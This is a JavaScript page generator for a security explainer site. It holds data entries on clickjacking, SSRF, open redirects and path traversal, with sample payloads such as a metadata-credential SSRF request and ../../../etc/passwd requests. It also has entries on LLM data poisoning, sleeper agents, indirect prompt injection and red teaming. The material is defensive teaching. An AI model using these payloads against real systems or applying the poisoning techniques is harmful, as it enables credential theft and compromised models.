      { q: 'Why do I get CORS errors?', a: 'CORS errors occur when your frontend (e.g., localhost:3000) makes a request to your backend (e.g., api.example.com) and the backend does not include the Access-Control-Allow-Origin header for your frontend\'s origin in its response.' },
      { q: 'Is Access-Control-Allow-Origin: * safe?', a: 'Wildcard (*) is safe for truly public APIs that serve non-sensitive data (public datasets, CDN assets). Never use * with Access-Control-Allow-Credentials: true — browsers block this combination. For APIs with authentication, whitelist specific origins.' },
    ],
    related: ['content-security-policy', 'what-is-csrf', 'cross-origin-resource-policy', 'cross-origin-opener-policy'],
  },
  {
    slug: 'what-is-clickjacking',
    title: 'What Is Clickjacking?',
    answer: 'Clickjacking (UI redressing) is an attack where a malicious website embeds your legitimate site in a transparent iframe and overlays it with a decoy UI. Users think they are clicking on the visible page, but they are actually clicking hidden buttons on your site — authorizing payments, changing settings, or granting permissions.',
    types: [
      { name: 'Classic Clickjacking', desc: 'Your site is loaded in a transparent iframe positioned over a fake button.', example: '<iframe src="https://bank.com/transfer?to=attacker&amount=1000" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>' },
      { name: 'Likejacking', desc: 'Social media buttons (Like, Follow, Share) are hidden under innocuous elements, tricking users into social actions.' },
      { name: 'Cursorjacking', desc: 'The visible cursor position is offset from the actual cursor position, causing users to click on different elements than they intend.' },
    ],
    prevention: `# 1. X-Frame-Options header (legacy but widely supported)
X-Frame-Options: DENY

# 2. CSP frame-ancestors directive (modern, more flexible)
Content-Security-Policy: frame-ancestors 'none'

# 3. JavaScript frame-buster (fallback for very old browsers)
<style>body { display: none; }</style>
<script>
  if (self === top) {
    document.body.style.display = 'block';
  } else {
    top.location = self.location;
  }
</script>

# 4. SameSite cookies prevent authenticated clickjacking
Set-Cookie: session=abc; SameSite=Strict`,
    impact: 'Unauthorized actions on the victim\'s behalf — fund transfers, account setting changes, social media interactions, permission grants (camera, microphone), and downloading malware.',
    faq: [
      { q: 'What is clickjacking?', a: 'Clickjacking is when an attacker embeds your website in an invisible iframe on their malicious page. Users think they are clicking elements on the visible page, but they are actually clicking hidden buttons on your site, performing unintended actions.' },
      { q: 'How do I prevent clickjacking?', a: 'Set the X-Frame-Options: DENY header or use CSP frame-ancestors: \'none\' to prevent your site from being embedded in iframes. Both methods tell the browser to refuse rendering your page inside a frame.' },
      { q: 'Does clickjacking work on mobile?', a: 'Yes. Clickjacking works on mobile browsers through touch events. The transparent iframe captures tap events just as it captures clicks on desktop. The same defenses (X-Frame-Options, CSP) apply.' },
    ],
    related: ['x-frame-options', 'content-security-policy', 'what-is-csrf', 'what-is-xss'],
  },
  {
    slug: 'what-is-ssrf',
    title: 'What Is SSRF (Server-Side Request Forgery)?',
    answer: 'Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks your server into making HTTP requests to unintended destinations — typically internal services, cloud metadata endpoints, or other systems behind the firewall. The server acts as a proxy, giving the attacker access to resources they cannot reach directly.',
    types: [
      { name: 'Basic SSRF', desc: 'The attacker provides a URL that the server fetches, targeting internal resources.', example: 'POST /api/fetch-url { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }' },
      { name: 'Blind SSRF', desc: 'The server makes the request but does not return the response. The attacker infers information from timing or out-of-band channels.' },
      { name: 'SSRF via redirects', desc: 'The attacker provides a URL that redirects to an internal resource, bypassing URL validation.' },
    ],
    prevention: `# 1. Allowlist approach — only permit known-safe destinations
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']
def fetch_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")

# 2. Block internal IP ranges
import ipaddress
def is_internal(hostname):
    ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    return ip.is_private or ip.is_loopback or ip.is_link_local

# 3. Disable redirects
requests.get(url, allow_redirects=False)

# 4. Use a metadata firewall for cloud environments
# AWS: IMDSv2 requires a PUT request with hop limit
# GCP: Requires Metadata-Flavor: Google header`,
    impact: 'In the 2019 Capital One breach, SSRF was used to access AWS metadata endpoints, stealing credentials that led to 106 million customer records being exposed. SSRF can read cloud credentials, access internal databases, scan internal networks, and pivot to other services.',
    faq: [
      { q: 'What is SSRF?', a: 'SSRF is when an attacker makes your server send HTTP requests to unintended destinations. Since the request comes from your server (inside the firewall), it can access internal services, cloud metadata endpoints, and other resources the attacker cannot reach directly.' },
      { q: 'Why is SSRF dangerous in cloud environments?', a: 'Cloud instances have metadata endpoints (169.254.169.254) that return IAM credentials, API keys, and configuration data. SSRF can access these endpoints from inside the cloud network, potentially compromising the entire cloud account.' },
      { q: 'How do I prevent SSRF?', a: 'Use URL allowlists, block internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x), disable HTTP redirects, and use cloud-specific protections like AWS IMDSv2. Never trust user-supplied URLs without validation.' },
    ],
    related: ['what-is-sql-injection', 'what-is-open-redirect', 'what-is-directory-traversal', 'content-security-policy'],
  },
  {
    slug: 'what-is-open-redirect',
    title: 'What Is an Open Redirect Vulnerability?',
    answer: 'An open redirect is a vulnerability where a web application accepts a user-supplied URL and redirects the browser to it without validation. Attackers exploit this to create phishing links that start with your trusted domain but redirect to a malicious site, bypassing spam filters and user suspicion.',
    types: [
      { name: 'URL parameter redirect', desc: 'Application uses a query parameter to determine redirect destination.', example: 'https://trusted.com/login?redirect=https://evil.com/phishing' },
      { name: 'Header-based redirect', desc: 'Application reads the Referer or Host header to redirect.' },
      { name: 'JavaScript redirect', desc: 'Client-side code reads URL parameters and redirects via window.location.' },
    ],
    prevention: `# 1. Allowlist approach — only permit known-safe destinations
ALLOWED_REDIRECTS = ['/dashboard', '/profile', '/settings']
def safe_redirect(url):
    if url in ALLOWED_REDIRECTS:
        return redirect(url)
    return redirect('/dashboard')

# 2. Validate the URL is relative (no protocol or host)
def is_safe_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    return not parsed.netloc and not parsed.scheme

# 3. Use indirect references (map IDs to URLs)
REDIRECTS = {'1': '/dashboard', '2': '/profile'}
redirect_to = REDIRECTS.get(request.args.get('dest'), '/dashboard')

# 4. Never redirect to user-supplied full URLs
# BAD:  redirect(request.args.get('next'))
# GOOD: redirect(validate_relative_url(request.args.get('next')))`,
    impact: 'Phishing attacks using your domain\'s reputation, OAuth token theft by redirecting authorization callbacks, bypassing URL-based security controls, and SSO token interception.',
    faq: [
      { q: 'What is an open redirect?', a: 'An open redirect is when your application takes a URL from user input and redirects the browser to it without checking if the destination is safe. Attackers use this to create phishing links that appear to come from your trusted domain.' },
      { q: 'Why are open redirects dangerous?', a: 'Users trust links starting with your domain. An open redirect lets attackers create links like https://yoursite.com/redirect?url=https://evil.com that look legitimate but land on phishing pages. Email filters and security tools also trust your domain, letting the link through.' },
      { q: 'How do I fix an open redirect?', a: 'Only allow redirects to relative URLs (same site), maintain an allowlist of permitted destinations, or use indirect references (numeric IDs that map to URLs). Never pass user-supplied full URLs directly to redirect functions.' },
    ],
    related: ['what-is-xss', 'what-is-ssrf', 'what-is-csrf', 'what-is-clickjacking'],
  },
  {
    slug: 'what-is-directory-traversal',
    title: 'What Is Directory Traversal (Path Traversal)?',
    answer: 'Directory traversal (path traversal) is a vulnerability where an attacker manipulates file path inputs to access files outside the intended directory. By using ../ sequences, the attacker can read sensitive files like /etc/passwd, application configuration files, source code, and environment variables containing database credentials and API keys.',
    types: [
      { name: 'Basic traversal', desc: 'Using ../ to navigate up directories.', example: 'GET /api/file?name=../../../etc/passwd' },
      { name: 'Encoded traversal', desc: 'URL-encoding or double-encoding ../ to bypass filters.', example: 'GET /api/file?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
      { name: 'Null byte injection', desc: 'Appending %00 to truncate file extensions (legacy, mostly fixed).', example: 'GET /api/file?name=../../../etc/passwd%00.png' },
    ],
    prevention: `# 1. Use basename() — strip all path components
import os
filename = os.path.basename(user_input)  # "../../etc/passwd" → "passwd"

# 2. Resolve and validate the full path
base_dir = os.path.realpath('/app/uploads')
requested = os.path.realpath(os.path.join(base_dir, user_input))
if not requested.startswith(base_dir):
    raise ValueError("Path traversal detected")

# 3. Node.js equivalent
const path = require('path');
const base = path.resolve('/app/uploads');
const requested = path.resolve(base, userInput);
if (!requested.startsWith(base)) {
  throw new Error('Path traversal detected');
}

# 4. Chroot or containerization — OS-level isolation
# Run the application in a container with only necessary files mounted`,
    impact: 'Reading source code reveals business logic and other vulnerabilities. Reading .env or config files exposes database credentials, API keys, and secrets. In severe cases, writing to the filesystem enables remote code execution.',
    faq: [
      { q: 'What is directory traversal?', a: 'Directory traversal is when an attacker manipulates file path inputs (using ../ sequences) to access files outside the intended directory. This can expose sensitive system files, application source code, and configuration files containing secrets.' },
      { q: 'How do I prevent directory traversal?', a: 'Use basename() to strip directory components, resolve the full path and verify it stays within the allowed directory, reject inputs containing ../ or encoded variants, and run applications in containers with minimal file access.' },
      { q: 'What files do attackers target with directory traversal?', a: 'Common targets: /etc/passwd (user accounts), .env files (secrets), config files (database credentials), application source code, SSH keys (~/.ssh/id_rsa), and cloud credential files (~/.aws/credentials).' },
    ],
    related: ['what-is-sql-injection', 'what-is-ssrf', 'what-is-xss', 'what-is-open-redirect'],
  },
];

const LLM_SECURITY = [
  {
    slug: 'llm-data-poisoning',
    title: 'LLM Data Poisoning — Training Data Attacks Explained',
    answer: 'LLM data poisoning is an attack where adversaries manipulate training data to introduce backdoors, biases, or vulnerabilities into a language model. Because LLMs learn patterns from their training corpus, poisoned data can cause the model to produce incorrect outputs, leak sensitive information, or behave maliciously when triggered by specific inputs.',
    sections: [
      { heading: 'How Data Poisoning Works', content: 'Attackers inject malicious content into publicly accessible training data sources — web crawls, open-source datasets, Wikipedia edits, Stack Overflow answers, or GitHub repositories. When the LLM trains on this poisoned data, it learns the attacker\'s intended behavior alongside legitimate patterns. The attack can be targeted (triggered by specific phrases) or broad (degrading overall model quality).' },
      { heading: 'Types of Data Poisoning', content: '<strong>Backdoor poisoning:</strong> The model behaves normally except when a specific trigger phrase activates the backdoor, producing attacker-controlled output. <strong>Availability poisoning:</strong> Degrades overall model performance by introducing noisy or contradictory data. <strong>Bias poisoning:</strong> Skews model outputs toward specific viewpoints, products, or recommendations. <strong>Sleeper agent poisoning:</strong> The model appears aligned during testing but activates malicious behavior under specific conditions in production.' },
      { heading: 'Defense Strategies', content: 'Curate training data from trusted sources and verify data provenance. Use data deduplication and outlier detection to identify suspicious samples. Implement robust evaluation benchmarks that test for known backdoor patterns. Fine-tune with high-quality, human-reviewed data. Monitor model outputs in production for unexpected behavior patterns.' },
    ],
    faq: [
      { q: 'What is LLM data poisoning?', a: 'Data poisoning is when attackers inject malicious content into an LLM\'s training data to make the model produce incorrect, biased, or harmful outputs. The poisoned data can introduce backdoors that activate on specific trigger phrases.' },
      { q: 'Can I detect if my LLM has been poisoned?', a: 'Detection is difficult. Use diverse evaluation benchmarks, test for known trigger patterns, monitor production outputs for anomalies, and compare model behavior against a clean baseline. Automated red-teaming can help surface hidden behaviors.' },
      { q: 'How does data poisoning differ from prompt injection?', a: 'Data poisoning attacks the model during training — the malicious behavior is baked into the model weights. Prompt injection attacks the model at inference time through crafted inputs. Data poisoning is harder to fix because it requires retraining the model.' },
    ],
    related: ['llm-training-data-leakage', 'llm-supply-chain-risks', 'what-is-prompt-injection', 'ai-red-teaming-guide'],
  },
  {
    slug: 'llm-model-extraction',
    title: 'LLM Model Extraction — Stealing AI Models via API',
    answer: 'Model extraction is an attack where an adversary systematically queries an LLM API to reconstruct a functionally equivalent copy of the model. By collecting enough input-output pairs, the attacker can train a surrogate model that mimics the target\'s behavior without paying for training costs, violating intellectual property, or bypassing usage restrictions.',
    sections: [
      { heading: 'How Model Extraction Works', content: 'The attacker sends a large number of carefully crafted queries to the target API and records the responses. These input-output pairs become training data for a surrogate model. Advanced attacks use active learning to minimize the number of queries needed — focusing on inputs where the surrogate model is most uncertain, thereby maximizing information gained per query.' },
      { heading: 'Types of Model Extraction', content: '<strong>Fidelity extraction:</strong> Creates a model that matches the target\'s outputs as closely as possible. <strong>Functionally-equivalent extraction:</strong> Creates a model that performs the same task at similar quality without matching exact outputs. <strong>Side-channel extraction:</strong> Uses response timing, token probabilities, or other metadata to infer model architecture and parameters.' },
      { heading: 'Defense Strategies', content: 'Implement rate limiting and query budgets per API key. Monitor for unusual query patterns (high volume, systematic input variation, repeated edge-case probing). Add watermarking to model outputs. Limit output detail — return only top-1 predictions instead of full probability distributions. Use differential privacy during training to limit what can be learned from outputs.' },
    ],
    faq: [
      { q: 'What is LLM model extraction?', a: 'Model extraction is when an attacker queries your LLM API many times to collect input-output pairs, then uses that data to train their own copy of your model. This steals your intellectual property and training investment without needing access to the original model weights.' },
      { q: 'How many queries does it take to extract a model?', a: 'It depends on the model complexity and desired fidelity. Research has shown that practical extraction of distilled models can require as few as 10,000-100,000 queries for classification tasks. For large generative models, the cost is higher but decreasing with better active learning techniques.' },
      { q: 'How do I detect model extraction attempts?', a: 'Monitor for API keys making unusually high volumes of requests, queries with systematic input variation, requests for unusual edge cases, and access patterns that resemble active learning. Set rate limits and anomaly detection on API usage.' },
    ],
    related: ['llm-data-poisoning', 'llm-training-data-leakage', 'llm-supply-chain-risks', 'owasp-llm-top-10'],
  },
  {
    slug: 'llm-training-data-leakage',
    title: 'LLM Training Data Leakage — When Models Memorize Secrets',
    answer: 'Training data leakage occurs when an LLM memorizes and reproduces sensitive information from its training data — including personal information, API keys, passwords, proprietary code, and copyrighted content. This is not a theoretical risk: researchers have extracted verbatim training examples from GPT-2, GPT-3, and other models using targeted prompting techniques.',
    sections: [
      { heading: 'How Training Data Leaks Happen', content: 'LLMs memorize training data that appears frequently or is distinctive enough to be learned as a pattern. When prompted with the beginning of a memorized sequence, the model completes it verbatim. Larger models memorize more data. Fine-tuned models are especially vulnerable because the fine-tuning dataset is typically small and heavily memorized.' },
      { heading: 'What Gets Leaked', content: 'Personal information (names, emails, phone numbers, addresses) from web scrapes. API keys and passwords accidentally committed to public GitHub repositories. Proprietary source code from code-trained models. Medical records, legal documents, and financial data if included in training. Copyrighted text reproduced verbatim.' },
      { heading: 'Defense Strategies', content: 'Scrub PII and secrets from training data before training. Use differential privacy during training to limit memorization. Implement output filters that detect and redact sensitive patterns (credit card numbers, API keys, SSNs). Test models for memorization using canary tokens — insert known unique strings during training and test if they can be extracted. Fine-tune with data deduplication to reduce memorization of repeated examples.' },
    ],
    faq: [
      { q: 'What is training data leakage?', a: 'Training data leakage is when an LLM memorizes sensitive information from its training data and reproduces it in responses. This can expose personal information, API keys, passwords, and proprietary content that was present in the training corpus.' },
      { q: 'How do I test if my model leaks training data?', a: 'Insert canary strings (unique identifiers) into training data. After training, prompt the model with the beginning of the canary to see if it completes it. Also test with known training examples, personal information patterns, and common secret formats (API keys, passwords).' },
      { q: 'Does fine-tuning increase leakage risk?', a: 'Yes, significantly. Fine-tuning datasets are small, so the model memorizes them more thoroughly than the pretraining corpus. A model fine-tuned on customer support transcripts may reproduce customer names, account numbers, and conversation details verbatim.' },
    ],
    related: ['llm-data-poisoning', 'llm-model-extraction', 'what-is-prompt-injection', 'how-to-prevent-prompt-injection'],
  },
  {
    slug: 'llm-hallucination-security',
    title: 'LLM Hallucinations as a Security Risk',
    answer: 'LLM hallucinations become a security risk when fabricated information is trusted and acted upon. Models confidently generate fake package names (dependency confusion attacks), non-existent API endpoints, incorrect security advice, fabricated legal citations, and made-up CVE numbers. When developers or automated systems act on hallucinated information, they introduce real vulnerabilities.',
    sections: [
      { heading: 'Security Risks from Hallucinations', content: '<strong>Package hallucination:</strong> LLMs recommend non-existent npm/PyPI packages. Attackers register these names and publish malicious packages, knowing developers will install them based on LLM suggestions. Research has found that 30%+ of packages recommended by GPT-4 for uncommon tasks do not exist. <strong>API hallucination:</strong> Models generate plausible but non-existent API endpoints or parameters, leading developers to build integrations that fail or connect to attacker-controlled endpoints. <strong>Security advice hallucination:</strong> Models provide incorrect security guidance — wrong CSP directives, insecure cryptographic configurations, or outdated mitigation strategies.' },
      { heading: 'Real-World Examples', content: 'In 2023, researchers found that ChatGPT hallucinated Python package names at high rates. They registered the hallucinated names on PyPI and received thousands of downloads within weeks. A lawyer submitted AI-generated legal briefs citing cases that did not exist. LLMs have recommended deprecated cryptographic algorithms and insecure default configurations.' },
      { heading: 'Mitigation Strategies', content: 'Never trust LLM output for security-critical decisions without human verification. Validate all package names before installing. Use lockfiles and dependency scanning tools. Cross-reference LLM security advice against official documentation. Implement guardrails that flag high-confidence claims about non-verifiable facts.' },
    ],
    faq: [
      { q: 'How are LLM hallucinations a security risk?', a: 'When LLMs hallucinate package names, API endpoints, or security advice, and developers trust and act on these hallucinations, they can install malicious packages, build broken integrations, or implement insecure configurations. The confidence of LLM output makes hallucinations particularly dangerous.' },
      { q: 'What is package hallucination?', a: 'Package hallucination is when an LLM recommends a software package that does not exist. Attackers monitor LLM outputs, register the hallucinated package names, and publish malicious code. Developers who follow the LLM\'s recommendation unknowingly install the attacker\'s package.' },
      { q: 'How do I verify LLM security advice?', a: 'Always cross-reference against official documentation (OWASP, MDN, vendor docs). Check that recommended packages exist and are actively maintained. Verify CVE numbers in the NVD database. Test security configurations in a staging environment before production deployment.' },
    ],
    related: ['llm-supply-chain-risks', 'llm-data-poisoning', 'rag-security-risks', 'owasp-llm-top-10'],
  },
  {
    slug: 'rag-security-risks',
    title: 'RAG Security Risks — Retrieval-Augmented Generation Vulnerabilities',
    answer: 'Retrieval-Augmented Generation (RAG) introduces unique security risks because it connects LLMs to external data sources. Attackers can poison the knowledge base with malicious content, use indirect prompt injection via retrieved documents, exfiltrate data through crafted queries, or manipulate retrieval rankings to surface attacker-controlled information.',
    sections: [
      { heading: 'Attack Vectors', content: '<strong>Knowledge base poisoning:</strong> If the RAG system indexes user-generated content, emails, or web pages, attackers can inject content designed to manipulate LLM responses when retrieved. <strong>Indirect prompt injection:</strong> Hidden instructions in documents that activate when the document is retrieved and fed to the LLM. <strong>Data exfiltration:</strong> Crafted queries designed to retrieve and expose sensitive documents from the knowledge base. <strong>Retrieval manipulation:</strong> SEO-like techniques to ensure attacker-controlled documents rank highest for specific queries.' },
      { heading: 'Common RAG Vulnerabilities', content: '<strong>No access control on retrieved documents:</strong> The RAG system retrieves documents the user should not have access to. <strong>Mixing trusted and untrusted sources:</strong> User-uploaded documents are treated with the same trust level as curated knowledge. <strong>No output filtering:</strong> Retrieved sensitive data passes through to the LLM response without redaction. <strong>Embedding injection:</strong> Adversarial text designed to have high similarity to target queries in the embedding space.' },
      { heading: 'Defense Strategies', content: 'Implement document-level access control that mirrors your existing permissions model. Separate trusted (curated) and untrusted (user-uploaded) document collections. Sanitize retrieved documents before injecting into the LLM prompt. Use output filtering to detect and redact sensitive data patterns. Monitor retrieval patterns for anomalies. Apply the principle of least privilege — only retrieve documents relevant to the user\'s role.' },
    ],
    faq: [
      { q: 'What are the main security risks of RAG?', a: 'The main risks are: knowledge base poisoning (injecting malicious content), indirect prompt injection via retrieved documents, data exfiltration through crafted queries, and missing access controls that let users access documents they should not see.' },
      { q: 'How do I secure a RAG pipeline?', a: 'Implement document-level access control, separate trusted and untrusted sources, sanitize retrieved content before passing to the LLM, filter sensitive data from outputs, and monitor for anomalous retrieval patterns. Treat retrieved documents as untrusted input.' },
      { q: 'Can RAG systems leak private documents?', a: 'Yes. If the RAG system does not enforce access control at retrieval time, a user can craft queries that retrieve documents they should not have access to. The LLM may then include content from these documents in its response.' },
    ],
    related: ['what-is-indirect-prompt-injection', 'what-is-prompt-injection', 'llm-data-poisoning', 'llm-hallucination-security'],
  },
  {
    slug: 'llm-supply-chain-risks',
    title: 'LLM Supply Chain Risks — Model and Dependency Attacks',
    answer: 'LLM supply chain risks arise from the complex dependency chain involved in building AI applications: pretrained model weights, fine-tuning datasets, embedding models, vector databases, Python/JS packages, and API providers. A compromise at any point in this chain can introduce backdoors, leak data, or give attackers control over your AI system\'s behavior.',
    sections: [
      { heading: 'Attack Surfaces', content: '<strong>Model weights:</strong> Downloading pretrained models from Hugging Face or other hubs — malicious models can contain backdoors or execute arbitrary code via pickle deserialization. <strong>Dependencies:</strong> Python packages (transformers, langchain, etc.) can be compromised via typosquatting, dependency confusion, or maintainer account takeover. <strong>Fine-tuning data:</strong> Third-party datasets used for fine-tuning may be poisoned. <strong>API providers:</strong> Third-party LLM APIs can change model behavior, logging policies, or data retention without notice.' },
      { heading: 'Real-World Examples', content: 'Pickle deserialization attacks via malicious model files on Hugging Face. Dependency confusion attacks targeting AI-related package names. Compromised npm packages in LangChain.js ecosystem. Malicious fine-tuning datasets on public data repositories. Supply chain attacks via compromised Docker images for AI inference servers.' },
      { heading: 'Defense Strategies', content: 'Pin and hash all dependencies. Use safetensors format instead of pickle for model weights. Audit model files before loading. Verify checksums of downloaded models. Use private model registries with access control. Scan dependencies with tools like pip-audit, npm audit, and Snyk. Implement model signing and provenance tracking. Use isolated environments (containers, VMs) for model inference.' },
    ],
    faq: [
      { q: 'What are LLM supply chain risks?', a: 'LLM supply chain risks come from the many components involved in AI applications: pretrained models, datasets, packages, and APIs. A compromise at any point — a malicious model on Hugging Face, a poisoned dataset, or a compromised Python package — can give attackers control over your AI system.' },
      { q: 'Are Hugging Face models safe to download?', a: 'Not automatically. Model files in pickle format can execute arbitrary code when loaded. Use safetensors format when available, verify model checksums, check the model author\'s reputation, and scan files before loading. Never load untrusted pickle files.' },
      { q: 'How do I secure my AI dependency chain?', a: 'Pin exact versions in requirements.txt/package.json, verify checksums, use pip-audit/npm audit, prefer safetensors over pickle, maintain a private model registry, and run inference in isolated containers. Treat every external dependency as a potential attack vector.' },
    ],
    related: ['llm-data-poisoning', 'llm-model-extraction', 'llm-hallucination-security', 'owasp-llm-top-10'],
  },
  {
    slug: 'ai-red-teaming-guide',
    title: 'AI Red Teaming Guide — How to Test LLM Security',
    answer: 'AI red teaming is the practice of systematically testing LLM-powered applications for security vulnerabilities, safety failures, and alignment issues. Unlike traditional penetration testing, AI red teaming must address unique threats like prompt injection, jailbreaking, training data leakage, hallucination exploitation, and bias amplification that are specific to language models.',
    sections: [
      { heading: 'Red Teaming Methodology', content: '<strong>1. Define scope:</strong> Identify the LLM application, its system prompt, tools/APIs it can access, and the data it processes. <strong>2. Threat modeling:</strong> Map attack surfaces — prompt injection, jailbreaking, data exfiltration, tool abuse, and output manipulation. <strong>3. Attack execution:</strong> Systematically test each attack vector using known techniques and novel variations. <strong>4. Impact assessment:</strong> Evaluate the severity of successful attacks — data exposure, unauthorized actions, safety violations. <strong>5. Remediation:</strong> Recommend specific defenses for each finding.' },
      { heading: 'Attack Categories to Test', content: '<strong>Prompt injection:</strong> Direct and indirect injection attempts to override system instructions. <strong>Jailbreaking:</strong> Roleplay, hypothetical scenarios, and encoding techniques to bypass safety guardrails. <strong>Data exfiltration:</strong> Extracting system prompts, training data, or connected data sources. <strong>Tool abuse:</strong> Manipulating the LLM into misusing connected tools (APIs, databases, file systems). <strong>Output manipulation:</strong> Getting the model to produce harmful, biased, or misleading content. <strong>Denial of service:</strong> Inputs that cause excessive token generation, infinite loops, or resource exhaustion.' },
      { heading: 'Tools and Frameworks', content: 'Use LochBot\'s scanner for automated prompt injection testing against 31 known attack patterns. Microsoft\'s PyRIT framework provides automated red teaming for AI systems. OWASP\'s LLM Top 10 provides a structured checklist. Garak is an open-source LLM vulnerability scanner. Manual testing remains essential — automated tools miss novel attack vectors and application-specific vulnerabilities.' },
    ],
    faq: [
      { q: 'What is AI red teaming?', a: 'AI red teaming is the systematic testing of LLM applications for security vulnerabilities, safety failures, and alignment issues. It covers prompt injection, jailbreaking, data leakage, tool abuse, and output manipulation — threats unique to AI systems that traditional security testing does not address.' },
      { q: 'How often should I red team my LLM application?', a: 'Red team before every major release, after system prompt changes, when adding new tools or data sources, and on a regular cadence (quarterly minimum). LLM vulnerabilities evolve rapidly as new attack techniques are discovered, so continuous testing is ideal.' },
      { q: 'What is the difference between AI red teaming and traditional pentesting?', a: 'Traditional pentesting focuses on infrastructure, network, and web application vulnerabilities (SQLi, XSS, etc.). AI red teaming additionally tests for prompt injection, jailbreaking, training data leakage, hallucination exploitation, and tool abuse — threats specific to LLM-powered systems.' },
    ],
    related: ['what-is-prompt-injection', 'how-to-prevent-prompt-injection', 'owasp-llm-top-10', 'llm-data-poisoning'],
  },
];

// ─── HTML TEMPLATE ──────────────────────────────────────────────────────────

function buildPage(data) {
  const { slug, title, faq, related } = data;
  const url = `${BASE_URL}/answers/${slug}.html`;
  const allSlugs = getAllSlugs();

  // Build main content based on data type
  let mainContent = '';
  if (data.headerValue) {
    // Security header page
    mainContent = buildHeaderPage(data);
  } else if (data.types) {
    // Web security page
    mainContent = buildWebSecPage(data);
  } else if (data.sections) {
    // LLM security page
    mainContent = buildLLMSecPage(data);
  }

  // Build FAQ JSON-LD
  const faqJsonLd = JSON.stringify({
    '@context': 'https://schema.org',
    '@type': 'FAQPage',
    mainEntity: faq.map(f => ({
      '@type': 'Question',
      name: f.q,
      acceptedAnswer: { '@type': 'Answer', text: f.a }
    }))
  }, null, 2);

  // Build related links
  const relatedLinks = related
    .filter(r => allSlugs.has(r) || PROTECTED.has(r + '.html'))
    .map(r => {
      const label = r.replace(/-/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
      return `      <li><a href="/answers/${r}.html">${label}</a></li>`;
    }).join('\n');

  const desc = data.answer.substring(0, 155).replace(/"/g, '&quot;');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
  <title>${title} — LochBot</title>
  <meta name="description" content="${desc}">
  <meta name="robots" content="index, follow">
  <link rel="canonical" href="${url}">
  <link rel="alternate" type="application/atom+xml" title="LochBot Blog Feed" href="/blog/feed.xml">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
  <meta property="og:title" content="${title} — LochBot">
  <meta property="og:description" content="${desc}">
  <meta property="og:url" content="${url}">
  <meta property="og:type" content="article">
  <meta property="og:image" content="${BASE_URL}/assets/og-image.png">
  <meta property="og:site_name" content="Zovo Tools">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${title} — LochBot">
  <meta name="twitter:description" content="${desc}">
  <meta name="twitter:image" content="${BASE_URL}/assets/og-image.png">
  <script type="application/ld+json">
  ${faqJsonLd}
  </script>
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <header>
    <div class="container header-inner">
      <a href="/" class="logo">Loch<span>Bot</span></a>
      <button class="mobile-toggle" aria-label="Menu">&#9776;</button>
      <nav>
        <a href="/">Scanner</a>
        <a href="/about.html">About</a>
        <a href="/blog/">Blog</a>
        <div class="nav-right">
          <a href="https://zovo.one/pricing?utm_source=lochbot.com&amp;utm_medium=satellite&amp;utm_campaign=nav-link" class="nav-pro" target="_blank">Go Pro &#10022;</a>
          <a href="https://zovo.one/tools" class="nav-zovo">Zovo Tools</a>
        </div>
      </nav>
    </div>
  </header>

  <nav class="breadcrumb" aria-label="Breadcrumb">
    <div class="container">
      <a href="/">Home</a> &rsaquo; <a href="/answers/">Answers</a> &rsaquo; <span>${data.shortTitle || title}</span>
    </div>
  </nav>

  <div class="page-content">
    <h1>${title}</h1>

    <p><strong>${data.answer}</strong></p>

${mainContent}

    <h2>Related Questions</h2>
    <ul>
${relatedLinks}
    </ul>

    <p style="margin-top:2rem;"><a href="/">Scan your system prompt with LochBot</a> &mdash; free, client-side, no data sent anywhere.</p>
  </div>

  <section class="faq-section" style="max-width:720px;margin:2rem auto;">
    <h2>Frequently Asked Questions</h2>
${faq.map(f => `    <details>
      <summary>${f.q}</summary>
      <p>${f.a}</p>
    </details>`).join('\n')}
  </section>

  <footer class="site-footer">
    <div class="footer-inner">
      <div class="footer-brand">Zovo Tools</div>
      <div class="footer-tagline">Free developer tools by a solo dev. No tracking.</div>
      <a href="https://zovo.one/pricing?utm_source=lochbot.com&amp;utm_medium=satellite&amp;utm_campaign=footer-link" class="footer-cta">Zovo Lifetime &mdash; $99 once, free forever &rarr;</a>
      <div class="footer-copy">&copy; 2026 <a href="https://zovo.one">Zovo</a> &middot; 47/500 founding spots</div>
    </div>
  </footer>

  <nav class="zovo-network" aria-label="Zovo Tools Network">
    <div class="zovo-network-inner">
      <h3 class="zovo-network-title">Explore More Tools</h3>
      <div class="zovo-network-links">
        <a href="https://abwex.com">ABWex — A/B Testing</a>
        <a href="https://claudflow.com">ClaudFlow — Workflows</a>
        <a href="https://claudhq.com">ClaudHQ — Prompts</a>
        <a href="https://claudkit.com">ClaudKit — API</a>
        <a href="https://enhio.com">Enhio — Text Tools</a>
        <a href="https://epochpilot.com">EpochPilot — Timestamps</a>
        <a href="https://gen8x.com">Gen8X — Color Tools</a>
        <a href="https://gpt0x.com">GPT0X — AI Models</a>
        <a href="https://heytensor.com">HeyTensor — ML Tools</a>
        <a href="https://invokebot.com">InvokeBot — Webhooks</a>
        <a href="https://kappafy.com">Kappafy — JSON</a>
        <a href="https://kappakit.com">KappaKit — Dev Toolkit</a>
        <a href="https://kickllm.com">KickLLM — LLM Costs</a>
        <a href="https://krzen.com">Krzen — Image Tools</a>
        <a href="https://lockml.com">LockML — ML Compare</a>
        <a href="https://ml3x.com">ML3X — Matrix Math</a>
      </div>
    </div>
  </nav>
</body>
</html>`;
}

function buildHeaderPage(data) {
  const directiveRows = data.directives.map(d =>
    `      <tr><td><code>${escHtml(d.name)}</code></td><td>${d.desc}</td></tr>`
